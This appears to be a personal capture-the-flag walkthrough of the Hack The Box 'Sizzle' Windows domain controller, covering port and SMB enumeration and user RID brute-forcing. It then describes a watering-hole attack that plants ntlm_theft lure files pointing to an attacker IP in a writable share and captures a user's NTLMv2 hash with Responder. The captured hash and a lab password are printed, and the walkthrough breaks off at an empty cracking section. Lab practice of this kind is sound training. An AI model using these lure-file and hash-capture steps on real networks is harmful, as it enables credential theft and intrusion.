# Host file setup
```python
sudo nxc smb 10.129.19.191 --generate-hosts-file /etc/hosts
[sudo] password for kali: 
SMB         10.129.19.191   445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
```
- SMB signing is enabled
- Null auth 

```python
nxc smb sizzle.htb.local -u 'amanda' -p 'Ashare1972'
```
# Enumeration
## Open ports
```python
nmap -p- --min-rate=2000 -sT -Pn 10.129.19.191                                                       
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-15 16:09 +0100
Nmap scan report for 10.129.19.191
Host is up (0.014s latency).
Not shown: 65507 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
5986/tcp  open  wsmans
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49673/tcp open  unknown
49688/tcp open  unknown
49689/tcp open  unknown
49692/tcp open  unknown
49695/tcp open  unknown
49710/tcp open  unknown
49720/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 66.19 seconds
```

## Nmap
```python
nmap -p 21,53,80,135,139,389,443,445,464,593,636,3268,3269,5985,5986,9389 -A --min-rate=2000 -sT -Pn sizzle.htb.local
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-15 16:13 +0100
Nmap scan report for sizzle.htb.local (10.129.19.191)
Host is up (0.014s latency).
rDNS record for 10.129.19.191: SIZZLE.HTB.LOCAL

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
443/tcp  open  ssl/https?
|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
3269/tcp open  ssl/ldap
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp open  ssl/wsmans?
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2021-02-11T12:59:51
|_Not valid after:  2022-02-11T12:59:51
|_ssl-date: 2026-04-15T15:15:29+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
9389/tcp open  mc-nmf        .NET Message Framing
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|2016|2008|7 (91%)
OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7
Aggressive OS guesses: Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2016 (89%), Microsoft Windows 7 or Windows Server 2008 R2 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# SMB (445)
Null auth enabled but not able to use it to enumerate shares or users

## Guest access
### Shares
```python
nxc smb sizzle.htb.local -u 'Guest' -p '' --shares
SMB         10.129.19.191   445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.19.191   445    SIZZLE           [+] HTB.LOCAL\Guest: 
SMB         10.129.19.191   445    SIZZLE           [*] Enumerated shares
SMB         10.129.19.191   445    SIZZLE           Share           Permissions     Remark
SMB         10.129.19.191   445    SIZZLE           -----           -----------     ------
SMB         10.129.19.191   445    SIZZLE           ADMIN$                          Remote Admin
SMB         10.129.19.191   445    SIZZLE           C$                              Default share
SMB         10.129.19.191   445    SIZZLE           CertEnroll                      Active Directory Certificate Services share
SMB         10.129.19.191   445    SIZZLE           Department Shares READ            
SMB         10.129.19.191   445    SIZZLE           IPC$            READ            Remote IPC
SMB         10.129.19.191   445    SIZZLE           NETLOGON                        Logon server share 
SMB         10.129.19.191   445    SIZZLE           Operations                      
SMB         10.129.19.191   445    SIZZLE           SYSVOL                          Logon server share
```
Read access on `Department Shares` and `IPC$`
### Users
```python
nxc smb sizzle.htb.local -u 'Guest' -p '' --rid-brute 20000
SMB         10.129.19.191   445    SIZZLE           [*] Windows 10 / Server 2016 Build 14393 x64 (name:SIZZLE) (domain:HTB.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.19.191   445    SIZZLE           [+] HTB.LOCAL\Guest: 
SMB         10.129.19.191   445    SIZZLE           498: HTB\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           500: HTB\Administrator (SidTypeUser)
SMB         10.129.19.191   445    SIZZLE           501: HTB\Guest (SidTypeUser)
SMB         10.129.19.191   445    SIZZLE           502: HTB\krbtgt (SidTypeUser)
SMB         10.129.19.191   445    SIZZLE           503: HTB\DefaultAccount (SidTypeUser)
SMB         10.129.19.191   445    SIZZLE           512: HTB\Domain Admins (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           513: HTB\Domain Users (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           514: HTB\Domain Guests (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           515: HTB\Domain Computers (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           516: HTB\Domain Controllers (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           517: HTB\Cert Publishers (SidTypeAlias)
SMB         10.129.19.191   445    SIZZLE           518: HTB\Schema Admins (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           519: HTB\Enterprise Admins (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           520: HTB\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           521: HTB\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           522: HTB\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           525: HTB\Protected Users (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           526: HTB\Key Admins (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           527: HTB\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           553: HTB\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.19.191   445    SIZZLE           571: HTB\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.19.191   445    SIZZLE           572: HTB\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.19.191   445    SIZZLE           1001: HTB\SIZZLE$ (SidTypeUser)
SMB         10.129.19.191   445    SIZZLE           1102: HTB\DnsAdmins (SidTypeAlias)
SMB         10.129.19.191   445    SIZZLE           1103: HTB\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.19.191   445    SIZZLE           1104: HTB\amanda (SidTypeUser)
SMB         10.129.19.191   445    SIZZLE           1603: HTB\mrlky (SidTypeUser)
SMB         10.129.19.191   445    SIZZLE           1604: HTB\sizzler (SidTypeUser)
```
Found all the users

```python
nxc smb sizzle.htb.local -u 'Guest' -p '' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 > users.txt
```
Ive re-ran this using some extra commands to pull the users out of the output

```python
cat users.txt   
Administrator
Guest
krbtgt
DefaultAccount
SIZZLE$
amanda
mrlky
sizzler
```
All the users

# `Department Shares`
```python
smbclient //sizzle.htb.local/'Department Shares' -U 'Guest'%''                                         
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul  3 16:22:32 2018
  ..                                  D        0  Tue Jul  3 16:22:32 2018
  Accounting                          D        0  Mon Jul  2 20:21:43 2018
  Audit                               D        0  Mon Jul  2 20:14:28 2018
  Banking                             D        0  Tue Jul  3 16:22:39 2018
  CEO_protected                       D        0  Mon Jul  2 20:15:01 2018
  Devops                              D        0  Mon Jul  2 20:19:33 2018
  Finance                             D        0  Mon Jul  2 20:11:57 2018
  HR                                  D        0  Mon Jul  2 20:16:11 2018
  Infosec                             D        0  Mon Jul  2 20:14:24 2018
  Infrastructure                      D        0  Mon Jul  2 20:13:59 2018
  IT                                  D        0  Mon Jul  2 20:12:04 2018
  Legal                               D        0  Mon Jul  2 20:12:09 2018
  M&A                                 D        0  Mon Jul  2 20:15:25 2018
  Marketing                           D        0  Mon Jul  2 20:14:43 2018
  R&D                                 D        0  Mon Jul  2 20:11:47 2018
  Sales                               D        0  Mon Jul  2 20:14:37 2018
  Security                            D        0  Mon Jul  2 20:21:47 2018
  Tax                                 D        0  Mon Jul  2 20:16:54 2018
  Users                               D        0  Tue Jul 10 22:39:32 2018
  ZZ_ARCHIVE                          D        0  Mon Jul  2 20:32:58 2018

		7779839 blocks of size 4096. 3166383 blocks available
smb: \>
```
Only `Users` and `ZZ_ARCHIVE` and `Tax` contain data

The path `Users/Public/` is writable in SMB i can try a watering hole attack

# Watering hole attack
```python
python3 ntlm_theft.py -g all -s 10.10.14.90 -f meeting
/home/kali/htb/Sizzle/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
Created: meeting/meeting.scf (BROWSE TO FOLDER)
Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
Created: meeting/meeting.lnk (BROWSE TO FOLDER)
Created: meeting/meeting.rtf (OPEN)
Created: meeting/meeting-(stylesheet).xml (OPEN)
Created: meeting/meeting-(fulldocx).xml (OPEN)
Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: meeting/meeting-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
Created: meeting/meeting-(includepicture).docx (OPEN)
Created: meeting/meeting-(remotetemplate).docx (OPEN)
Created: meeting/meeting-(frameset).docx (OPEN)
Created: meeting/meeting-(externalcell).xlsx (OPEN)
Created: meeting/meeting.wax (OPEN)
Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
Created: meeting/meeting.asx (OPEN)
Created: meeting/meeting.jnlp (OPEN)
Created: meeting/meeting.application (DOWNLOAD AND OPEN)
Created: meeting/meeting.pdf (OPEN AND ALLOW)
Created: meeting/zoom-attack-instructions.txt (PASTE TO CHAT)
Created: meeting/meeting.library-ms (BROWSE TO FOLDER)
Created: meeting/Autorun.inf (BROWSE TO FOLDER)
Created: meeting/desktop.ini (BROWSE TO FOLDER)
Created: meeting/meeting.theme (THEME TO INSTALL
Generation Complete.
```
First ill generate the files with my IP address inside

```python
sudo responder -I tun0
```
This started a listener

```python
smb: \Users\Public\> prompt off
smb: \Users\Public\> mput meeting*
```
This planted the files in the share

```python
[SMB] NTLMv2-SSP Client   : 10.129.19.191
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:86c0335d88d43520:103EB57BE6B34F59ED9721CF15B92335:010100000000000080EE9EC0F4CCDC015EA13D572A34B0590000000002000800590058004400530001001E00570049004E002D004E004200490038003000390050004D0030003300590004003400570049004E002D004E004200490038003000390050004D003000330059002E0059005800440053002E004C004F00430041004C000300140059005800440053002E004C004F00430041004C000500140059005800440053002E004C004F00430041004C000700080080EE9EC0F4CCDC01060004000200000008003000300000000000000001000000002000007F8946A95DC4C9A5217BF48DC3C2A224BE254FAC65F2034534200E8F6F1797350A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E0039003000000000000000000000000000
[*] Skipping previously captured hash for HTB\amanda
[*] Skipping previously captured hash for HTB\amanda
```
Ive captured a hash

## Cracking the hash
```python

```